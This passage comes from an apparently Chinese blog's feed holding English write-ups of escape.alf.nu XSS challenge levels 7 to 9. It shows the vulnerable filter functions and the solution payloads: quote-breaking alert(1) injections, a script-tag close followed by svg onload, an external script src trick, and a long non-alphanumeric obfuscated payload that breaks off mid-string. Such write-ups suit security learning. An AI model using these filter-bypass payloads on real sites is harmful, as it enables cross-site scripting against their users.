<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </span></span></div><div class="line">	<span class="comment">// Pass inn "callback#userdata"  </span></div><div class="line">	<span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>);  </div><div class="line">	<span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;  </div><div class="line">	<span class="keyword">var</span> obj = {<span class="string">'userdata'</span>: thing[<span class="number">1</span>] };  </div><div class="line">	<span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\u003c'</span>);  </div><div class="line">	<span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>";</div><div class="line">}</div></pre></td></tr></table></figure>

<p>We will enclose the opening bracket and the json fixed contents with single quotes to transform it into a string and then we will be able to inject our js payload:</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'#'</span>;alert(<span class="number">1</span>)<span class="comment">//</span></div></pre></td></tr></table></figure>

<p>It will render:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="string">'({"userdata":"'</span>;alert(<span class="number">1</span>)<span class="comment">//"})</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<h3 id="Level_8:">Level 8:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {  </span></div><div class="line">	<span class="comment">// Courtesy of Skandiabanken  </span></div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s.toUpperCase() + '</span><span class="string">")&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>There is no escaping function, only an upper case, so we can close the exisiting”script”tag and create a new tag (case insensitive) with an    onload  script using no alpha characters:</p>
<p>These are some valid solutions:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//   (52)</span></span></span></div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>//   (<span class="attribute">51</span>)</span></div><div class="line">&lt;/<span class="attribute">script</span>&gt;<span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>//   (<span class="attribute">50</span>)</span></div></pre></td></tr></table></figure>

<p>I guess people solving the challange with 28 characters or so did something like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"&lt;very short domain&gt;"</span>&gt;</span><span class="javascript"></span></div></pre></td></tr></table></figure>

<h2 id="Part2"><a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">Part2</a></h2>
]]></content>
    <summary type="html">
    <![CDATA[<hr>

<h2 id="前言">前言</h2>
<p>这是国外的XSS游戏<a href="http://escape.alf.nu" target="_blank" rel="external">escape.alf.nu</a>,国内也有类似的比如    <a href="http://prompt.ml" target="_blank" rel="external">prompt.ml</a>    </p>
]]>
    
    </summary>
    
      <category term="XSS" scheme="http://evilddog.github.io//tags/XSS/"/>
    
      <category term="前端安全" scheme="http://evilddog.github.io//categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[escape-Write-ups (Part 2)]]></title>
    <link href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/"/>
    <id>http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/</id>
    <published>2014-10-12T06:00:47.000Z</published>
    <updated>2014-11-05T16:23:06.000Z</updated>
    <content type="html"><![CDATA[<hr>

<h2 id="前言">前言</h2>
<p>这是接<a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">上一篇</a>的Write-up</p>
<a id="more"></a>

<h2 id="原文">原文</h2>
<h3 id="Level_9:">Level 9:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</span></span></div><div class="line">	<span class="comment">// This is sort of a spoiler for the last level :-)</span></div><div class="line">	<span class="keyword">if</span> (<span class="regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="keyword">return</span> <span class="string">'-'</span>;</div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>';</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Some as level 8 but now we cannot use angle brackets (&lt;&gt;) nor backslashes ()</p>
<p>Solutions:</p>
<p>Is it possible to use an online non-alphanumeric encoder to encode the following payload so it uses no alpha characters, angle brackets (&lt;&gt;) nor backslashes ()</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+<span class="function">alert</span>(1))<span class="comment">//</span></div></pre></td></tr></table></figure>

<p>Producing a huge solution (5627):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!!	[<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]])()([<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]])())[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]])()(([<span class="link_label"></span>]+{})[<span class="link_label">+[</span>]])[<span class="link_label">+[</span>]]+(!+[<span class="link_label"></span>]+!![<span class="link_label"></span>]+[<span class="link_label"></span>])+(!+[<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+[<span class="link_label"></span>]))+(+!![<span class="link_label"></span>]+[<span class="link_label"></span>])+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(+{}+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>]+[<span class="link_label"></span>][<span class="link_reference">(![</span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]][<span class="link_label">([</span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+(![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>]+{})[<span class="link_label">+!![</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]]((!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">!+[</span>]+!![<span class="link_label"></span>]+!![<span class="link_label"></span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+[</span>]]+(!![<span class="link_label"></span>]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span class="link_label"></span>][<span class="link_reference">[</span>]]+[<span class="link_label"></span>])[<span class="link_label">+!![</span>]]+([<span 